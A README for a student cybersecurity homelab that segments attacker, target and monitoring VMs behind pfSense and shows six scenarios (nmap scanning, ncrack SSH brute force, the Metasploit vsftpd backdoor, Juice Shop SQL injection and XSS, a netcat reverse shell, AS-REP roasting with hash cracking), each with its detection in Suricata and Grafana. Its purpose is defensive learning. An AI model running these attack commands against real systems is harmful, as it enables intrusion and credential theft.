# Virtual Cybersecurity Homelab

A security monitoring lab built across two machines — a MacBook running VMware Fusion Pro and a Windows laptop running VMware Workstation Pro, connected via Tailscale. The environment segments attacker, target, and monitoring infrastructure across isolated virtual networks behind pfSense with Suricata IDS, replicating network segmentation on a student budget.

Six attack scenarios have been executed end-to-end, with every offensive action detected, logged, and visualized through a custom monitoring pipeline.

![Tech Stack](https://img.shields.io/badge/pfSense-2.7-212121?logo=pfsense)
![Suricata](https://img.shields.io/badge/Suricata-IDS-EF3340)
![Kali](https://img.shields.io/badge/Kali_Linux-Attacker-557C94?logo=kalilinux)
![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker)
![Grafana](https://img.shields.io/badge/Grafana-10.2-F46800?logo=grafana)
![AD](https://img.shields.io/badge/Active_Directory-Domain-0078D4?logo=windows)

## Architecture

![Homelab Topology](Screenshots/homelab-topology.png)

## Hardware

| Machine | Role |
|---------|------|
| MacBook (VMware Fusion Pro) | pfSense, Kali Linux, Metasploitable 2, Ubuntu Server |
| Windows Laptop (VMware Workstation Pro) | Windows Server 2025 (DC), Windows 10 (workstation) |

The two machines are connected via Tailscale, enabling cross-host attack scenarios without modifying local network infrastructure.

## Network Segmentation

| Segment | Subnet | Interface | Purpose |
|---------|--------|-----------|---------|
| WAN | NAT | em0 | Internet access via host |
| LAN | 192.168.94.0/24 | vmnet2 | Kali (attacker), Ubuntu Server (monitoring) |
| DMZ | 192.168.97.0/24 | vmnet4 | Metasploitable 2, OWASP Juice Shop |
| AD Segment | 192.168.114.0/24 | Host-only | Domain Controller, Workstation |

pfSense routes all inter-segment traffic on the MacBook, enforcing firewall rules between LAN and DMZ. Suricata inspects traffic on the LAN interface with three rule categories enabled: `emerging-scan`, `emerging-exploit`, and `emerging-shellcode`. The AD segment runs on the Windows laptop and connects to the MacBook lab via Tailscale.

## Virtual Machines

| VM | RAM | Network | IP | Role |
|----|-----|---------|-----|------|
| pfSense | 3 GB | NAT, vmnet2, vmnet4 | 192.168.94.1 (LAN), 192.168.97.1 (DMZ) | Firewall, NAT, Suricata IDS, syslog forwarding |
| Kali Linux | 4 GB | vmnet2 | 192.168.94.0/24 (DHCP) | Attack platform |
| Ubuntu Server | 2 GB | vmnet2, vmnet4 | 192.168.94.200 (LAN), 192.168.97.200 (DMZ) | Monitoring stack (Docker Compose) |
| Metasploitable 2 | 512 MB | vmnet4 | 192.168.97.128 | Vulnerable target host |
| Windows Server 2025 | 4 GB | Host-only | 192.168.114.10 | Domain Controller (dmo.local) |
| Windows 10 | 2 GB | Host-only | 192.168.114.20 | Domain-joined workstation |

## Detection Pipeline

Every attack on the MacBook lab follows the same detection path:

```
Attack (Kali) → pfSense (Suricata + firewall logs) → Syslog UDP 5514 → FastAPI backend → InfluxDB → Grafana dashboards
```

The monitoring stack is the [Network Monitoring System](https://github.com/ml448/network-monitoring-dash) — a custom FastAPI + InfluxDB + Grafana pipeline deployed via Docker Compose on the Ubuntu Server VM. Suricata alerts and pfSense firewall logs are forwarded via syslog and surfaced in real time across 4 Grafana dashboards.

## Infrastructure Setup

### Suricata IDS

Suricata installed on pfSense and configured on the LAN (em1) interface with EVE JSON logging enabled:

![Suricata Installation](Screenshots/suricataprogress.png)
![Suricata Interface Config](Screenshots/suricatainterface.png)
![Suricata EVE Output Settings](Screenshots/suricatalogs.png)

### Syslog Forwarding

pfSense remote logging configured to forward firewall events to the monitoring stack:

![pfSense Remote Logging](Screenshots/remotelog.png)

### Network Connectivity

Verification of connectivity between all lab segments:

![Kali IP Configuration](Screenshots/KaliIP.png)
![Metasploitable IP Configuration](Screenshots/msfip.png)
![Kali to pfSense](Screenshots/pfSense_ping.png)
![Kali to Metasploitable](Screenshots/newmetasploitipping.png)
![Ubuntu Server to pfSense](Screenshots/ubuntupFping.png)

### Monitoring Stack

![Grafana Dashboard](Screenshots/grafana.png)

## Attack Scenarios

---

### Scenario 1 — Nmap Reconnaissance

**Attack:** Full port scan and service enumeration from Kali against Metasploitable.

```bash
nmap -Pn -n -sS -sV -O 192.168.97.128
```

![Nmap Scan Results](Screenshots/nmapresult.png)

**Detection:** Suricata fired `ET SCAN` signatures and pfSense filterlog captured connection attempts across all scanned ports. Both layers are visible in Grafana syslog dashboard.

![Suricata Nmap Detection](Screenshots/suricatanmap.png)
![Grafana Nmap Filterlog](Screenshots/grafananmapfilterlog.png)

---

### Scenario 2 — SSH Brute Force

**Attack:** Credential stuffing against Metasploitable SSH using ncrack.

```bash
ncrack -p 22 --user msfadmin -P ~/ssh_wordlist.txt 192.168.97.128 -T 4
```

![SSH Brute Force Attack](Screenshots/bruteforcessh.png)

**Detection:** Grafana showed a flood of port 22 connections in the syslog dashboard. The rapid connection volume made the brute force pattern clearly visible.

![SSH Brute Force Detection](Screenshots/bruteforceresult.png)

---

### Scenario 3 — Metasploit vsftpd 2.3.4 Backdoor Exploitation

**Attack:** Initial Nmap scan showed port 21 (FTP) with **version 2.3.4 of vsftpd**. Exploited the known supply chain backdoor to obtain a root shell.

```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.97.128
set LHOST 192.168.94.100
exploit
```

![Metasploit Module Search](Screenshots/msfconsole.png)
![Metasploit Exploit and Root Shell](Screenshots/msfconsole2.png)

**Detection:** Suricata flagged traffic on ports 21 (FTP) and 6200 (backdoor). Grafana displayed alerts for both the initial exploitation and the backdoor connection.

---

### Scenario 4 — SQL Injection & XSS (OWASP Juice Shop)

**Attack:** Achieved admin access to Juice Shop using basic SQL injection (`' OR 1=1--`), followed by XSS and API enumeration to extract all user records.

![API User Enumeration via cURL](Screenshots/eumeratingusers.png)
![Enumerated User Data](Screenshots/enumeratingusers2.png)
![Admin Panel Access](Screenshots/registereduser.png)
![XSS Proof of Concept](Screenshots/xssresult.png)

**Detection:** Suricata and pfSense filterlog captured the attack traffic. Grafana showed cascading alerts from the injection attempt through subsequent API abuse.

![Juice Shop Traffic in Grafana](Screenshots/juiceshop.png)

---

### Scenario 5 — Reverse Shell Detection

**Attack:** Established a simple netcat reverse shell from Metasploitable (DMZ) back to Kali (LAN) on port 4444.

```bash
# Kali (listener)
nc -lvnp 4444

# Metasploitable (target)
nc 192.168.94.100 4444 -e /bin/bash
```

![Reverse Shell](Screenshots/revshell.png)

**Detection:** pfSense filterlog captured the outbound DMZ-to-LAN connection on port 4444. This scenario demonstrates why egress filtering is critical as DMZ hosts should never initiate connections to internal networks.

![Reverse Shell Traffic in Grafana](Screenshots/revshelltraffic.png)

---

### Scenario 6 — AS-REP Roasting (Active Directory)

**Attack:** Exploited a misconfigured domain account with Kerberos pre-authentication disabled to extract a crackable AS-REP hash from the domain controller over Tailscale.

```bash
impacket-GetNPUsers dmo.local/jsmith -dc-ip 100.112.191.33 -no-pass -format hashcat
```
![AS-REP Roasting](Screenshots/kerberoast.png)
**Cracking:** Used John the Ripper with a custom wordlist and leetspeak rules to recover the plaintext password from the AS-REP hash.

```bash
john --wordlist=custom.txt --rules=leetspeak --format=krb5asrep asrep.txt
```
![Offline Cracking](Screenshots/result.png)

**Detection:** Windows Security Event ID 4768 on the domain controller logged the AS-REP request with RC4 encryption type, indicating a credential extraction attempt.

![Event Viewer Logs](Screenshots/eventviewer.png)

---

## Key Learnings

- **Suricata is RAM-sensitive on pfSense.** Trimming rule categories from the full set down to 3 (scan, exploit, shellcode) and allocating 3 GB RAM resolved instability and silent service failures.
- **pfSense pass rules don't log by default.** Enabling logging on LAN and DMZ pass rules was required for complete traffic visibility in the syslog dashboard.
- **Egress filtering matters.** Scenario 5 showed that without explicit deny rules, a compromised DMZ host can reach internal networks — a common misconfiguration in production environments.
- **Detection depth beats detection breadth.** Six well-documented scenarios with full pipeline validation are more valuable than twenty attacks with no proof of detection.
- **Kerberos encryption enforcement.** Windows Server, especially the latest 2025 version aggressively enforces AES-only Kerberos by default, blocking legacy RC4 even after registry and GPO changes, which is a meaningful security improvement over older Windows Server versions.
- **Cross-host labs need time synchronization.** Kerberos requires clocks within 5 minutes. Tailscale-connected VMs on different hosts can drift significantly, breaking authentication until synced.

## Monitoring Stack

The detection and visualization layer is a separate project and can be viewed below:

**[Network Monitoring System](https://github.com/ml448/network-monitoring-dash)** — FastAPI backend, InfluxDB time-series storage, 4 Grafana dashboards, JWT authentication, async email alerting, and syslog ingestion. Deployed via Docker Compose on the Ubuntu Server VM.

## Roadmap and Goals
- This will be a constantly maintained project
- Acquire hardware to tinker with 
- Kerberoasting via Rubeus from the domain-joined workstation
- Windows Event Log forwarding to the monitoring pipeline via Tailscale
- Grafana integration for AD security events
- Additional AD attack scenarios (Pass-the-Hash, DCSync)
- Expanded Suricata rule tuning for AD-specific attack signatures
